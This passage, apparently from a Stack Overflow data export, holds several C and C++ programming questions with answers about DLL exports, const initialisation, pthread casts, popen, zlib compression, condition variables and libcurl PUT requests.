    {
        // call the function
        uReturnVal = lpfnDllFunc1();
    }
}
</code></pre>

<p>But don't work. The function isn't found.</p>
","9530","","<p>My psychic senses tell me that the function wasn't found because you forgot to declare it as <code>extern ""C""</code>.</p>

<p>Because of <a href=""http://en.wikipedia.org/wiki/Name_mangling"" rel=""nofollow"">name mangling</a> in C++, the actual function name that gets put into the DLL's export table is a longer, more gibberish-y string than just <code>Test</code> if the function has C++ linkage.  If you instead declare it with C linkage, then it will be exported with the expected name and can therefore be imported more easily.</p>

<p>For example:</p>

<pre><code>// Header file
#ifdef __cplusplus
// Declare all following functions with C linkage
extern ""C""
{
#endif

__declspec(dllexport) bool Test();

#ifdef __cplusplus
}
// End C linkage
#endif

// DLL source file
extern ""C""
{

__declspec(dllexport) bool Test()
{
    // Function body
    ...
}

}  // End C linkage
</code></pre>
"
"<p>I am writing a program in C using XCode. I don't use C much, usually I use C++. I've never used XCode before.</p>

<p>Compile error is quite simple, the following lines of code are not being treated as compile time constants by the compiler.</p>

<pre><code>const double PI = 4.0 * atan(1.0);
const double TAU = 8.0 * atan(1.0);
</code></pre>

<p>I'm sure this is allowed in C++ 11, although I can't be certain, since I last used it some months ago.</p>

<p>My guess is that the XCode compiler / the C standard does not allow constants to be computed in this way.</p>

<p>Is there an alternative I can use? I don't much fancy the ""define"" alternative...</p>

<pre><code>#define PI 4.0 * atan(1.0);
</code></pre>

<p>As this will (may?) cause unnecessary run-time overhead.</p>
","9530","","<p>This is not allowed in C.  Unlike C++, C requires global variables to be initialized by <em>compile-time</em> constants.  <code>atan(1.0)</code> is not a compile-time constant because it requires calling the function <code>atan()</code> at runtime.</p>

<p>The simple solution is don't call <code>atan()</code>, just us the actual numeric values of pi and tau as your initializers:</p>

<pre><code>const double PI = 3.141592653589793;
const double TAU = 2*PI;
</code></pre>

<p>Some math libraries also provide the constant <code>M_PI</code> for you already, so you can just that:</p>

<pre><code>const double PI = M_PI;
</code></pre>

<p>but that's not standard C (C89 or C99), so don't rely on all implementations having that constant.</p>
"
"<h3>My code</h3>

<pre><code>#include &lt;pthread.h&gt;
#include &lt;unistd.h&gt;
#include &lt;stdio.h&gt;

void * thread_func1(void *args)
{
    printf(""thread 1 returning\n"");
    return ((void *)1);
}

void * thread_func2(void *args)
{
    printf(""thread 2 exiting\n"");
    pthread_exit((void *)2);
}

int main(void)
{
    int err;
    pthread_t tid1, tid2;
    void *tret;

    err = pthread_create(&amp;tid1, NULL, thread_func1, NULL);
    if(err)
    {
        printf(""cannot create thread 1\n"");
    }
    err = pthread_create(&amp;tid2, NULL, thread_func2, NULL);
    if(err)
    {
        printf(""cannot create thread 2\n"");
    }

    err = pthread_join(tid1, &amp;tret);
    if(err)
    {
        printf(""thread 1 join error\n"");
    }
    printf(""thread 1 return code:%d\n"", (int)tret);

    err = pthread_join(tid2, &amp;tret);
    if(err)
    {
        printf(""cannot join thread 2\n"");
    }
    printf(""thread 2 return code:%d\n"", (int)tret);
    exit(0);
}
</code></pre>

<p>when compling the code, there're two warnings:</p>

<pre><code>join.c:44: warning: cast from pointer to integer of different size
join.c:51: warning: cast from pointer to integer of different size
</code></pre>

<p>I read the man page of <a href=""http://man7.org/linux/man-pages/man3/pthread_join.3.html"" rel=""nofollow""><code>pthread_join</code></a>:</p>

<blockquote>
<pre><code> int pthread_join(pthread_t thread, void **retval);
</code></pre>
</blockquote>

<pre><code>   If retval is not NULL, then pthread_join() copies the exit status of
   the target thread (i.e., the value that the target thread supplied to
   pthread_exit(3)) into the location pointed to by *retval.  If the
   target thread was canceled, then PTHREAD_CANCELED is placed in
   *retval.
</code></pre>

<p>According to my understanding, the exist status(int type) is stored into <code>tret</code> in my code, so I use <code>(int)</code> to convert <code>void *</code> to <code>int</code>, but the above warnings are thrown out, So, my question is:</p>

<p>How to modify my code to clear up the warnings?</p>
","9530","","<p>These warnings are harmless (in <em>this</em> case) and can safely be ignored.</p>

<p>The warnings are coming from the casts on these lines:</p>

<pre><code>printf(""thread 1 return code:%d\n"", (int)tret);  // line 44
...
printf(""thread 2 return code:%d\n"", (int)tret);  // line 51
</code></pre>

<p>The compiler is complaining that you're casting a pointer (which may be 64 bits) down into a smaller, 32-bit integer.  A lot of legacy C code likes to cast back-and-forth between pointers and integers for various reasons.  In the old days, pointers were the same size as integers, so this was ok; but when 64-bit targets became more common, this is dangerous all of a sudden, since if you have a 64-bit pointer pointing above the address 0x00000000'ffffffff, you'll lose the upper bits when casting it to an integer.  When you cast that back to a 64-bit pointer later, your pointer will be incorrect, and attempting to use it will crash or silently corrupt memory.</p>

<p>The warnings here are just trying to help you avoid these <em>potential</em> problems.  If the value in your pointer isn't actually a real pointer, like in this case, then it's perfectly safe to cast it down to an integer if you know its value is never going to exceed 0xffffffff.</p>

<p>There are a few ways to suppress the warning.  You could disable it globally in your compiler's command line (not recommended); you could use a <code>#pragma</code> around the code to temporarily disable the warning (not portable); or, you could use some clever casting to work around it.</p>

<p>There are two data types, <code>intptr_t</code> and <code>uintptr_t</code>, which act just like ordinary integers—you can upcast/downcast to other integer types, you can do all sorts of arithmetic on then, etc.—but they're <em>guaranteed</em> to be large enough to hold a pointer value.  On a 32-bit system, <code>intptr_t</code> will be (at least) 32 bits wide; on a 64-bit system, <code>intptr_t</code> will be (at least) 64 bits wide.  The only difference between the two types is that <code>intptr_t</code> is signed while <code>uintptr_t</code> is unsigned.</p>

<p>Since the compiler knows that these types are always large enough to hold pointer values, it won't warn you when you cast a pointer to or from them.  Once you get into the integer domain, you can then cast to an ordinary <code>int</code> without fear of warnings.  So this code should eliminate your warnings:</p>

<pre><code>#include &lt;stdint.h&gt;
...
printf(""thread 1 return code:%d\n"", (int)(intptr_t)tret);  // line 44
printf(""thread 2 return code:%d\n"", (int)(intptr_t)tret);  // line 51
</code></pre>
"
"<p>I have a device which returns a string in response to commands written to the device file. I am able to write commands to the device and read the return string in C with code that looks like:</p>

<pre><code>int dev = open(""/dev/USBDev251"",O_RDWR);
write(dev,data,sizeof(data));
read(dev,buff,16);
</code></pre>

<p>Trying to do the same in python with:</p>

<pre><code>dev = os.open(""/dev/USBDev251"",os.O_RDWR)
os.write(dev, data)
os.read(dev,16)
</code></pre>

<p>The write is successful but only an empty string is returned. What am I missing here?</p>
","9530","","<p>According to the <a href=""http://docs.python.org/2/library/os.html#os.write"" rel=""nofollow""><code>os.write</code> documentation</a>:</p>

<blockquote>
  <p><strong>Note:</strong> This function is intended for low-level I/O and must be applied to a file descriptor as returned by <code>os.open()</code> or <code>pipe()</code>. To write a “file object” returned by the built-in function <code>open()</code> or by <code>popen()</code> or <code>fdopen()</code>, or <code>sys.stdout</code> or <code>sys.stderr</code>, use its <code>write()</code> method.</p>
</blockquote>

<p>You shouldn't be mixing and matching here.  If you use the global function <code>open()</code> to open a file, then you must only use the file object's <code>read()</code> and <code>write()</code> methods.  Conversely, if you use <code>os.open()</code> to open a file, then you must only use <code>os.read()</code> and <code>os.write()</code>.</p>

<p>So, try replacing your call to <code>open()</code> with <code>os.open()</code>; or, keep the <code>open()</code> call, and replace <code>os.write(dev, ...)</code> with <code>dev.write(...)</code> and replace <code>os.read(dev, ...)</code> with <code>dev.read(...)</code>.</p>
"
"<p>In my code I need to know about the location of some IP addresses. For getting this information, I send queries to a website with free API. Because C does not have this ability to send queries, I decide to run a shell script in my code. The returned response from the website is as follows:</p>

<pre><code>""IP address"",""US"",""United States"",""MI"",""Michigan"",""Dearborn"",""48121"",""42.3223"",""-83.1763"",""505"",""313""
</code></pre>

<p>I need just these two number: <code>""42.3223"",""-83.1763""</code> (latitude and longitude)<br>
My shell command is:  </p>

<pre><code>curl freegeoip.net/csv/{IPaddress} | awk -F'"",""' '{print $8,$9}'
</code></pre>

<p>For running the shell code into C , I used system() function, but this function does not return the values of <code>$8</code> and <code>$9</code></p>

<pre><code>int main ()
{
int i, ret = system(""curl freegeoip.net/csv/{IPaddress} | awk -F'"",""' '{print $8,$9}'"");
        printf(""My val= %d\n"",i);
        return 0;
}
</code></pre>

<p>I need these two values to be returned into my C code.<br>
I do not want to use popen(), because it opens and closes a file each time, and the number of my queries is too high which it would be too costly. </p>
","9530","","<blockquote>
  <p>Because C does not have this ability to send queries</p>
</blockquote>

<p>Sure it does.  What do you think <code>curl</code> and your shell are written in?  Of course, it's not <em>easy</em> to make HTTP requests in C, but it's certainly <em>possible</em>.</p>

<blockquote>
  <p>I do not want to use popen(), because it opens and closes a file each time, and the number of my queries is too high which it would be too costly.</p>
</blockquote>

<p>Your premise is wrong and your conclusion is wrong.  <code>popen()</code> doesn't open a file, it opens a pipe, which has a file descriptor associated with it, and is returned to your code via <code>FILE*</code> object.  When you have a pipe, the data that gets written to the pipe by one process never goes to disk, it's just stored in memory by the OS.  So the child process writes data to the in-memory pipe, and the parent process reads that data back, all without hitting disk.</p>

<p>Even ignoring that, the performance bottleneck of this program is not going to be pipeline.  The network is an order of magnitude slower than disk access (or anything else run locally), so the bottleneck is going to be the data transfer.  After that, the next bottleneck will be process creation, which is not cheap, but it's still way cheaper than network operations.  You're worrying about the wrong things here, performance-wise.</p>

<p>Just use <code>popen()</code> here, it's exactly what you need.  If you need to run a large number of queries, consider running them all in one command line to curl so that it can enable <a href=""https://en.wikipedia.org/wiki/HTTP_pipelining"" rel=""nofollow"">HTTP pipelining</a>.  Without that, each request would have to be sent on a separate TCP stream, which would increase overall latency.  If you really need very high performance, don't shell out to a subprocess—I'd suggest integrating <a href=""http://curl.haxx.se/libcurl/"" rel=""nofollow"">libcurl</a> directly into your program.</p>
"
"<p>Unable to compile C++ program in ubuntu.</p>

<pre><code>float x;
x=(m*Ts1)-(n*Ts);
new_samples[m]=(original_samples[n*Ts]*(sin(x))(2*pi*B))/(2*pi*B*(x));
</code></pre>

<p>I want to use <code>sin</code> function in C++. I have included <code>cmath</code>. Still it is giving error:</p>

<blockquote>
  <p>error: ‘std::sin(x)’ cannot be used as a function.</p>
</blockquote>
","9530","","<p>This is wrong:</p>

<pre><code>(sin(x))(2*pi*B)
</code></pre>

<p>C++ does not have implicit multiplication like you might be accustomed to in math -- <code>(a)(b)</code> tries to call <code>a</code> as a function, not multiply <code>a</code> and <code>b</code>, and in this case, <code>a</code> is <code>sin(x)</code>.  The return value of <code>sin(x)</code> is a <code>double</code>, and a <code>double</code> is not a callable function.</p>

<p>You really wanted to write this:</p>

<pre><code>(sin(x)) * (2*pi*B)
</code></pre>
"
"<p>I know in C we can modify the 'const int' via pointer. But while compiling the program I enabled the '-O2' flag in gcc, and const int can't modify the value, so just wanted to know how gcc optimization flag affect the modifying 'const int'.</p>

<p>Here is the sample application test.c</p>

<pre><code>#include &lt;stdio.h&gt;
#include &lt;stdlib.h&gt;

int main(int ac, char *av[])
{
        const int i = 888;
        printf(""i is %d \n"", i);
        int *iPtr = &amp;i;
        *iPtr = 100;
        printf(""i is %d \n"", i);
        return 0;
}

gcc -Wall -g -o test test.c
./test
i is 888 
i is 100

gcc -Wall -g -O2 -o test test.c
i is 888 
i is 888
</code></pre>

<p>This curiosity  leads me to write this question.</p>
","9530","","<blockquote>
  <p>I know in C we can modify the 'const int' via pointer.</p>
</blockquote>

<p>Nope, that's wrong.  The C language standard clearly says that modifying a <code>const</code> object is ""undefined behavior"".  That means that anything at all could happen—the code could succeed, it could crash, it could corrupt your hard drive, or make demons fly out of your nose.  All of those behaviors are considered legal.  So, the fact that the behavior changes depending on the compiler's optimization level is also perfectly legal.</p>

<p>Any compiler worth its salt will warn you about this.  With the <em>default</em> compiler options, GCC helpfully tells me this when I try to compile the code:</p>

<pre><code>$ gcc test.c
test.c: In function 'main':
test.c:8:21: warning: initialization discards 'const' qualifier from pointer target type [enabled by default]
</code></pre>

<p>Clang is similar:</p>

<pre><code>$ clang test.c
test.c:8:14: warning: initializing 'int *' with an expression of type
      'const int *' discards qualifiers
      [-Wincompatible-pointer-types-discards-qualifiers]
        int *iPtr = &amp;i;
             ^      ~~
</code></pre>
"
"<p>Have I understood this right, IF statements are more dependent on branch prediction and v-table look-up is more dependent on branch target prediction? Regarding v-tables, there is no ""branch prediction"", just the target prediction?</p>

<p>Trying to understand how a v-table is processed by the CPU.</p>
","9530","","<p>Branch prediction is predicting whether or not the branch will be <em>taken</em>. Branch target prediction is prediction <em>where</em> the branch is going to.  These two things are independent and can occur in all combinations.</p>

<p>Examples of these might be:</p>

<h2>Unconditional branch, fixed target</h2>

<ul>
<li>Infinite loop</li>
<li><code>goto</code> statement</li>
<li><code>break</code> or <code>continue</code> statement</li>
<li>End of the 'then' clause of an <code>if/else</code> statement (to jump past the <code>else</code> clause)</li>
<li>Non-virtual function call</li>
</ul>

<h2>Unconditional branch, variable target</h2>

<ul>
<li>Returning from a function</li>
<li>Virtual function call</li>
<li>Function pointer call</li>
<li><code>switch</code> statement (if compiled into a jump table)</li>
</ul>

<h2>Conditional branch, fixed target</h2>

<ul>
<li><code>if</code> statement</li>
<li><code>switch</code> statement (if compiled into a series of <code>if/else</code> statements)</li>
<li>Loop condition tests</li>
<li>The <code>&amp;&amp;</code> and <code>||</code> operators</li>
<li>The ternary <code>?:</code> operator</li>
</ul>

<h2>Conditional branch, variable target</h2>

<ul>
<li>Less likely to show up under normal conditions, but the compiler may synthesize one as an optimization, combining two of the above cases.  For example, on x86, the compiler may optimize code like <code>if (condition) { obj-&gt;VirtualFunctionCall(); }</code> into a conditional indirect jump like <code>jne *%eax</code> if it appears at the end of a function due to tail call optimization.</li>
</ul>
"
"<p>Hi I have created a dialog box and it woks.</p>

<p>My question is: how do you retreive the handle for it?</p>

<p>Also, if you get the handle, how would you change the static text control text inside it?</p>

<pre><code>class CStatisticsDlg : public CDialogEx
{
public:
    CStatisticsDlg();

// Dialog Data
    enum { IDD = IDD_STATISTICS };

protected:
    virtual void DoDataExchange(CDataExchange* pDX);    // DDX/DDV support

// Implementation
protected:
    DECLARE_MESSAGE_MAP()
public:
};

CStatisticsDlg::CStatisticsDlg() : CDialogEx(CStatisticsDlg::IDD)
{
}

void CStatisticsDlg::DoDataExchange(CDataExchange* pDX)
{
    CDialogEx::DoDataExchange(pDX);
}

BEGIN_MESSAGE_MAP(CStatisticsDlg, CDialogEx)
END_MESSAGE_MAP()
</code></pre>
","9530","","<p>Assuming you're using MFC (as indicated by the tag), then presumably you have a <a href=""http://msdn.microsoft.com/en-us/library/132s802t.aspx"" rel=""nofollow""><code>CDialog</code></a> class instance.  <code>CDialog</code> is a subclass of <a href=""http://msdn.microsoft.com/en-us/library/1xb05f0h.aspx"" rel=""nofollow""><code>CWnd</code></a>, so you can retrieve the window handle by one of 3 ways:</p>

<ul>
<li>Directly accessing its <a href=""http://msdn.microsoft.com/en-us/library/zwdbkfhc.aspx"" rel=""nofollow""><code>m_hWnd</code></a> member</li>
<li>Casting it to an <code>HWND</code> with <a href=""http://msdn.microsoft.com/en-us/library/bcs64shx.aspx"" rel=""nofollow""><code>operator HWND()</code></a></li>
<li>Calling <a href=""http://msdn.microsoft.com/en-us/library/d64ehwhz.aspx"" rel=""nofollow""><code>GetSafeHwnd()</code></a> on it</li>
</ul>
"
"<pre><code>#include &lt;bits/stdc++.h&gt;
using namespace std;

#define vi vector&lt;int&gt;
#define vvi vector&lt;vi&gt;

int main() {
    vi v(10, -1);
    vvi vv(10, v);
    for(int i=0; i&lt;vv.size(); i++){
        for(int j=0; j&lt;vv[i].size(); j++){
            cout &lt;&lt; vv[i][j] &lt;&lt; "" "";
        }
        cout &lt;&lt; endl;
    }
}
</code></pre>

<p>When I compile the above code, no error is reported and it runs fine (<a href=""http://ideone.com/cb1Lxr"" rel=""nofollow"">see this</a>). But when I declare a vector of vector of int using <code>vector &lt; vector &lt; int&gt;&gt;</code> an error occurs because I have not put a space between the right angle brackets. So why is no error reported in the first case when all that <code>#define</code> does is replace the occurrences of <code>vi</code> with <code>vector&lt;int&gt;</code> and <code>vvi</code> with <code>vector&lt; vector&lt; int&gt;&gt;</code>? </p>
","9530","","<p>The error occurs because in C++03, the double angle brackets are interpreted as the right shift operator <code>&gt;&gt;</code>.  In C++11, the language was altered so that it is interpreted as closing the template arguments instead, so it should compile without errors in C++11 mode.  You can work around this by putting a space between the closing angle brackets, e.g. <code>vector&lt;vector&lt;int&gt; &gt;</code>.</p>

<p>Also, don't use <code>#define</code> to define type aliases like this; use <code>typedef</code> instead, as that's exactly what it's intended for.</p>
"
"<p>In testing and debugging C++ code, there are often errors that visual studio can detect.  Usually it responds by creating a breaking window pop up that let's you halt execution and inspect the call stack and values of variables etc.</p>

<p>I am wondering if there is any possible way to have the debugger throw an exception instead of doing it's normal break.</p>

<p>I want to be able to do something like:</p>

<pre><code>try {
    functionThatMightBreak(); // break as in, derefence null, uninitialized variable, iterator not derefenceable etc
} catch (SomeType e) {
    // a bit more stuff
}
</code></pre>
","9530","","<p>If you compile your code with the <a href=""http://msdn.microsoft.com/en-us/library/1deeycx5.aspx"" rel=""nofollow""><code>/EHa</code></a> compiler option, then the compiler will generate code such that Win32 exceptions (such as access violations) will be thrown like regular C++ exceptions and can be caught by <code>catch(...)</code> blocks.</p>

<p>If you do this, be careful that all of your code is compiled with the same options (and be especially careful of any third-party libraries you're using).</p>
"
"<p>I am writing a small server http which always send his generated html page(it discard the client request). This is for a part of a larger program</p>

<p>I want to use content-encoding for minimizing the Local bandwith usage...</p>

<p>I started by trying this example:</p>

<pre><code>#include &lt;sys/types.h&gt;
#include &lt;netinet/in.h&gt;
#include &lt;sys/socket.h&gt;
#include &lt;stdio.h&gt;
#include &lt;stdlib.h&gt;
#include &lt;string.h&gt;
#include &lt;time.h&gt;
#include &lt;pthread.h&gt;
#include &lt;zlib.h&gt;
#define CHUNK 1048576

const char * restrict UrList[] = {""An"", ""example"", ""of"", ""random"",""ASCII string""};

void reponse(int newsockfd)
{
    char * buffer=calloc(sizeof(char),4700);
    srand(time(0));
    sscanf(buffer,""&lt;!DOCTYPE html&gt;\ // hopfully this is a test as I don't hard code like this in real programs...
&lt;html&gt;\
&lt;head&gt;\
    &lt;meta http-equiv=\""Content-Type\"" content=\""text/html; charset=utf-8\""&gt;\
    &lt;title color=\""white\""&gt;%s&lt;/title&gt;\
    &lt;body align=\""center\"" valign=\""center\"" &gt;\
        &lt;button onclick=\""launchFullscreen(document.body);\""&gt;%s!&lt;/button&gt;\
    &lt;/body&gt;\
&lt;/html&gt;\0"",UrList[(rand()%3)]);
    size_t inputLen = strlen(buffer);
    uLong maxOutputLen = compressBound(inputLen);
    char * destbuffer=malloc(inputLen);
    compress2(destbuffer,&amp;maxOutputLen,buffer,inputLen,Z_BEST_COMPRESSION);
    sprintf(buffer,""200 OK\n\
Server: Serveur personalisé ayant pour but d'empêcher les accès au nom de domaines interdits de manière efficace\n\
X-Powered-By: GCC 4.8.1\n\
Cache-Control: must-revalidate, post-check=0, pre-check=0\n\
ETag: \""1390786010\""\n\
Content-Language: fr\n\
Vary: Accept-Encoding\n\
Content-Type: text/html; charset=UTF-8\n\
\n\
%s \0"",destbuffer);
    write(newsockfd,buffer,inputLen);
    free((void *)buffer);
    free((void *)destbuffer);
}

void main()
{
    struct  sockaddr_in6 client_address, server_address;
    int clilen,server_handle=socket(PF_INET6, SOCK_STREAM, 0);

    if (server_handle &lt; 0)
        perror(""Unable to create socket."");
    server_address.sin6_family = AF_INET6;
    server_address.sin6_addr = in6addr_any;
    server_address.sin6_port = 0x5000; // port 80
    if ( bind(server_handle, (struct sockaddr *)&amp;server_address, sizeof( server_address )) &lt; 0)
        perror(""Unable to bind."");
    listen(server_handle,1310730);
    clilen=sizeof(client_address);
    while(1)
    {
        // variables locales
        pthread_t parallel;

        int newsockfd=accept(server_handle, (struct sockaddr *) &amp;client_address, &amp;clilen);
        pthread_create(&amp;parallel,NULL,reponse,(void *)newsockfd);
    }
}
</code></pre>

<p>which don't work, because when I launch <code>telnet 192.168.0.20 80</code> nothing is printed.</p>

<p>According a step by step exectution in GDB, the buffer have the correct value when write() is called<br>
The main idea is that I can't compress a file directly since I need do in-memory operations on the results in the real program.</p>
","9530","","<p>You have a number of problems:</p>

<ol>
<li>You're calling <code>sscanf()</code> to read data out of an empty buffer right at the start.  I think you meant to use <code>sprintf()</code> to write your test data into the buffer (but really, use <a href=""http://linux.die.net/man/3/snprintf"" rel=""nofollow""><code>snprintf()</code></a> to avoid overflowing your buffer).</li>
<li>You're using the same buffer for input to the <code>compress2()</code> function as you are for output.  The documentation is not clear on if this is supported, so I would assume that it's not for safety.</li>
<li>You're lying to zlib about how big your output buffer is.  You're telling it that your buffer is <code>compressBound(...)</code> bytes, when in fact it's only 4700 bytes.  Because it's impossible to compress every possible data stream, there are some sequences of bytes which get larger after compression, so it's possible for zlib to try to overflow your buffer if you lie to it, and then can cause a segfault.  If you at least tell it the truth about how big your buffer is, it will fail with an error in that cause instead of trying to read/write memory out of bounds.</li>
<li>The 2nd parameter to <code>compress2()</code> is a <em>pointer</em> to a variable which is both an input and output parameter.  On input, it contains the <em>maximum</em> size of the output buffer, and on output, it receives the <em>actual</em> size of the compressed data.  You're passing an integer value (not a pointer) and ignoring the compiler warning about a conversion between integer and pointer types.  <strong>Listen to your compiler!</strong></li>
</ol>

<p>Here's how to properly call the <code>compress2()</code> function using separate input and output buffers:</p>

<pre><code>// Error checking elided for expository purposes
const char *inputBuf = ""the data to compress..."";
size_t inputLen = strlen(inputBuf);

// Compute the maximum size of the compressed output and allocate an output
// buffer for it -- note that this will be LARGER than the input size
uLong maxOutputLen = compressBound(inputLen);
char *outputBuf = malloc(maxOutputLen);

// Compress the data and receive the compressed data size
uLong compressedLen = maxOutputLen;
int result = compress2(outputBuf, &amp;compressedLen, inputBuf, inputLen, Z_BEST_COMPRESSION);

// Use the compressed data
...

free(outputBuf);
</code></pre>
"
"<p>I have a simple application that interfaces with different pieces of hardware. For each piece of hardware, I spawn a <code>pthread_t</code> against a unique monitor function, for a total of 6 threads: 1 manager thread, and 5 worker threads.</p>

<p>Each thread has a common initialization routine where it waits for the manager thread to wake it up via:</p>

<pre><code>pthread_mutex_lock(&amp;mMutex);
pthread_cond_wait(&amp;mMutex, &amp;condVar);
pthread_mutex_lock(&amp;mMutex);
</code></pre>

<p>The main thread then wakes up all of the threads by signalling them one at a time:</p>

<pre><code>pthread_cond_wait(&amp;mMutex1, &amp;condVar1);
pthread_cond_wait(&amp;mMutex2, &amp;condVar2);
...
pthread_cond_wait(&amp;mMutex5, &amp;condVar5);
</code></pre>

<p>The code actually works fine, but this is because I am lucky with the timing. There is the remote but existent chance that when the main/manager thread issues <code>pthread_cond_signal</code>, that the thread is not yet done initialization. I need to find a way to guarantee that each and every condition variable has had a <code>wait</code> call made on it by its respective worker thread.</p>

<p>I could always create a status boolean that is set within the corresponding mutex, but I cannot atomically do both the <code>set</code> and the <code>wait</code> operation in one instruction, so far as I know. I could also make use of a <code>pthread_barrier_t</code>, but that just guarantees all the threads are one or two instructions before making their respective <code>wait</code> calls.</p>

<p>Is there a tried-and-true method of being certain that the <code>wait</code> call has been made, or do I need to employ some means of timed wait looping/checking?</p>

<p>Thank you.</p>
","9530","","<blockquote>
  <p>I could always create a status boolean that is set within the corresponding mutex, but I cannot atomically do both the set and the wait operation in one instruction, so far as I know.</p>
</blockquote>

<p>That's the right way to do it -- you <em>can</em> do a set and wait operation atomically, because of the way condition variables interact with mutexes.  When you do a <code>pthread_cond_wait()</code> operation, you <em>must</em> have the mutex that you pass in be locked.  If you correspondingly have that same mutex locked when you do a <code>pthread_cond_signal()</code>, the waiting thread doesn't wake up until the signalling thread unlocks the mutex.</p>

<p>So, the following code would do what you want:</p>

<pre><code>// Flag indicating if the worker thread is waiting or not
bool waiting = false;
...

// Worker thread code
... do stuff ...
while (!condition_is_not_satisfied())
{
    pthread_mutex_lock(&amp;mutex);
    waiting = true;
    pthread_cond_wait(&amp;cond, &amp;mutex);
    waiting = false;
    pthread_mutex_unlock(&amp;mutex);
}
...

// Signalling thread code
pthread_mutex_lock(&amp;mutex);
if (waiting)
{
    // Worker thread is waiting -- signal it to wake up
    pthread_cond_signal(&amp;cond);
}
else
{
    // Worker thread has not yet entered the wait state -- do something else
}
pthread_mutex_unlock(&amp;mutex);
</code></pre>
"
"<p>How can I draw simple function as for example |x| or x^2 with cartesian coordinate system in win32api? Is it possible?</p>
","9530","","<p>Yes, it's possible.  You probably want to use functions like <a href=""http://msdn.microsoft.com/en-us/library/windows/desktop/dd145069%28v=vs.85%29.aspx"" rel=""nofollow""><code>MoveToEx()</code></a> and <a href=""http://msdn.microsoft.com/en-us/library/windows/desktop/dd145029%28v=vs.85%29.aspx"" rel=""nofollow""><code>LineTo()</code></a> to draw line segments onto a GDI surface in your <code>WM_PAINT</code> handler.  Of course, you have to compute all of the data points yourself and pass them to Windows; it doesn't have any built-in functionality for graphing functions.</p>
"
"<p>It is more than a funny question. :-)</p>

<p>I wish to initialize an array in C, but instead of zeroing out the array with <code>calloc</code>. I want to set all element to one. Is there a single function that does just that?</p>

<p>I have used my question above to search in google, no answer. Hope you can help me out! FYI, I am first year CS student just starting to program in C. </p>
","9530","","<p>There is no such function.  You can implement it yourself with a combination of <code>malloc()</code> and either <code>memset()</code> (for character data) or a <code>for</code> loop (for other integer data).</p>

<p>The impetus for the <code>calloc()</code> function's existence (vs. <code>malloc()</code> + <code>memset()</code>) is that it can be a nice performance optimization in some cases.  If you're allocating a lot of data, the OS might be able to give you a range of virtual addresses that are already initialized to zero, which saves you the extra cost of manually writing out 0's into that memory range.  This can be a large performance gain because you don't need to page all of those pages in until you actually use them.</p>

<p>Under the hood, <code>calloc()</code> might look something like this:</p>

<pre><code>void *calloc(size_t count, size_t size)
{
    // Error checking omitted for expository purposes
    size_t total_size = count * size;
    if (total_size &lt; SOME_THRESHOLD)  // e.g. the OS's page size (typically 4 KB)
    {
        // For small allocations, allocate from normal malloc pool
        void *mem = malloc(total_size);
        memset(mem, 0, total_size);
        return mem;
    }
    else
    {
        // For large allocations, allocate directory from the OS, already zeroed (!)
        return mmap(NULL, total_size, PROT_READ|PROT_WRITE, MAP_ANON|MAP_PRIVATE, -1, 0);
        // Or on Windows, use VirtualAlloc()
    }
}
</code></pre>
"
"<p>I am currently writing a REST-like client that only is required to do PUT requests.</p>

<p><strong>Problem:</strong> <br>
Running the program is not giving me the correct results on the URL's API and I do not know why.</p>

<p>Using curl_easy_perform(curl) does not throw an error when called. But the expected result is not generated on the URL's API.</p>

<p>Using curl_easy_send(curl,..,..,..) throws a : unsupported protocol error</p>

<p><strong>Assumption:</strong><br>
I am assuming the order in which I am using the curl_easy_opts is a problem?  And I am even missing a couple of key lines?  </p>

<p>I have been reading on here of how other people do PUT requests and have been using their methods.</p>

<p><strong>Summary of Program:</strong></p>

<p>My program prompts the user for some string/character data, and from that, I construct the strings myself such as the header and the payload.  The header and payload are both in JSON format but the payload is simply a string ( in this case, a char *str = (char *)mallo.. etc).  How the header is constructed is shown below.</p>

<p>My header is being constructed using </p>

<pre><code>struct curl_slist *headers = NULL;
headers = curl_slist_append(headers, ""Accept: application/json"");
//there is more content being appended to the header
</code></pre>

<p><strong>The CURL function calls :</strong></p>

<pre><code>    //init winsock stuff
    curl_global_init(CURL_GLOBAL_ALL);

    //get a curl handle
    curl = curl_easy_init();

if(curl){
    //append the headers
    curl_easy_setopt(curl, CURLOPT_HTTPHEADER, headers);

    //specify the target URL
    curl_easy_setopt(curl, CURLOPT_URL, url);

    //connect ( //i added this here since curl_easy_send() says it requires it. )
    curl_easy_setopt(curl, CURLOPT_CONNECT_ONLY,1L); 

    //specify the request (PUT in our case)
    curl_easy_setopt(curl, CURLOPT_CUSTOMREQUEST, ""PUT"");

    //append the payload
    curl_easy_setopt(curl, CURLOPT_POSTFIELDS, payload);

    res = curl_easy_perform(curl);
    //res = curl_easy_send(curl, payload, strlen(payload),&amp;iolen);

    //check for errors
    if(res != CURLE_OK)
        fprintf(stderr, ""curl_easy_perform() failed: %s\n"", curl_easy_strerror(res));

    curl_easy_cleanup(curl);
}
</code></pre>
","9530","","<p>You should not be using the <code>CURLOPT_CONNECT_ONLY</code> option or <code>curl_easy_send()</code> function, those are intended to be used for custom, non-HTTP protocols.</p>

<p>See <a href=""http://curl.haxx.se/libcurl/c/httpput.html"" rel=""nofollow"">this page</a> for an example of how to do a PUT request with libcurl.  Basically, you want to enable the <code>CURLOPT_UPLOAD</code> and <code>CURLOPT_PUT</code> options to say that you're doing a PUT request and to enable uploading a body with the request, and then you set the <code>CURLOPT_READDATA</code> and <code>CURLOPT_INFILESIZE_LARGE</code> options to tell libcurl how to read the data you're uploading and how big the data is.</p>

<p>In your case, if you already have the data in memory, then you don't need to read it out of a file, and you can just <code>memcpy()</code> it inside your read callback.</p>

<p>Example code copied below:</p>

<pre><code>/***************************************************************************
 *                                  _   _ ____  _
 *  Project                     ___| | | |  _ \| |
 *                             / __| | | | |_) | |
 *                            | (__| |_| |  _ &lt;| |___
 *                             \___|\___/|_| \_\_____|
 *
 * Copyright (C) 1998 - 2012, Daniel Stenberg, &lt;daniel@haxx.se&gt;, et al.
 *
 * This software is licensed as described in the file COPYING, which
 * you should have received as part of this distribution. The terms
 * are also available at http://curl.haxx.se/docs/copyright.html.
 *
 * You may opt to use, copy, modify, merge, publish, distribute and/or sell
 * copies of the Software, and permit persons to whom the Software is
 * furnished to do so, under the terms of the COPYING file.
 *
 * This software is distributed on an ""AS IS"" basis, WITHOUT WARRANTY OF ANY
 * KIND, either express or implied.
 *
 ***************************************************************************/ 
#include &lt;stdio.h&gt;
#include &lt;fcntl.h&gt;
#include &lt;sys/stat.h&gt;
#include &lt;curl/curl.h&gt;

/*
 * This example shows a HTTP PUT operation. PUTs a file given as a command
 * line argument to the URL also given on the command line.
 *
 * This example also uses its own read callback.
 *
